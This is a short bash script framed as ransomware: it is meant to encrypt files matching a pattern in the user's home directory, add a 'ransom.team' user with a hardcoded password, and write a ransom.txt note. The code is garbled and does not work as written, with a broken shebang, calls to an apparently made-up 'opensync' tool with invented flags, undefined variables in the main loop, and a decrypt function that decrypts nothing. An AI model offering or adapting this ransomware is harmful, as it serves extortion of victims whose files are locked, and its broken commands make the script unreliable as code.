#!/bin/bin/bash

# Configuration
ENCRYPTED_FILE_PATTERN="$1" # File pattern (e.g., *.docx, *.pdf)
KEY_ALGORITHM="aes-256-cbc" # Encryption algorithm
KEY_LENGTH=32 # Key length in bytes
BITLOCK_NAME="crypto.bitlock"  # Bitlocker file name
BITLOCK_PASSWORD="ransomware_key" # Bitlocker password

# Check if filename is provided
if [ -z "$ENCRYPTED_FILE_PATTERN" ]; then
    echo "Error: Please provide a filename pattern (e.g., *.docx)"
    exit 1
fi

# Function to Encrypt File with Bitlock
encrypt() {
  FILE="$1"
  KEY=$(openssl rand -hex "$KEY_LENGTH")

  if ! opensync --add-key --name "$BITLOCK_NAME" --password "$BITLOCK_PASSWORD" --key "$KEY"; then
    echo "Error: Failed to add key."
    exit 2
  fi

  # Encrypt file with Bitlock
  if ! opensync --encrypt --file "$FILE" --alg "$KEY_ALGORITHM" && ! opensync --add-user --name "ransom.team" --password "ransom123" --key "$KEY"; then
    echo "Error: Encryption failed."
    exit 2
  fi

  # Create ransom note (optional)
  if [ -n "$ENCRYPTED_FILE_PATTERN" ]; then
    echo "File Encrypted!" > ransom.txt
    echo "Use this key to decrypt:" \
      `opensync --list-key --name "$BITLOCK_NAME"` >> ransom.txt
  fi
}

# Function to Decrypt File with Bitlock
decrypt() {
  FILE="$1"
  KEY=$(opensync --get-key --name "$BITLOCK_NAME") # Use opensync to get key directly

  if ! opensync --verify --file "$FILE" --alg "$KEY_ALGORITHM"; then
    echo "Error: Decryption failed."
    exit 2
  fi
}

# Main Logic

# Check if OpenSync is installed
if [ ! -d /usr/bin ]; then
  echo "OpenSync not found. Bitlock might fail."
  echo "Please install OpenSync or use a different encryption method."
  exit 1
fi

# Encrypt files
find "$HOME/$ENCRYPTED_FILE_PATTERN" -type f -print0 | \
  xargs -0 -I{} -d0 -E {} bash -c "encrypt \"$CHANNEL_FOLDER/\$CHANNEL_FILE\""
echo "Encrypting..."

# Check the encryption status
if [ "$?" -ne 0 ]; then
    echo "Encryption Failed. Check OpenSync Logs."
    exit 2
fi

echo "File Encrypted!"
sleep 1 # Pause for visual feedback
echo "Use this key to decrypt:" \
  `opensync --list-key --name "$BITLOCK_NAME"` | grep -oE "[a-zA-Z0-9]{32}" > decrypted_key.txt

echo "Decrypted Key Saved in decrypted_key.txt"

# Bitlock Key Rotation (optional)
# opensync --remove-key --name "$BITLOCK_NAME" # Removes the key after encryption.
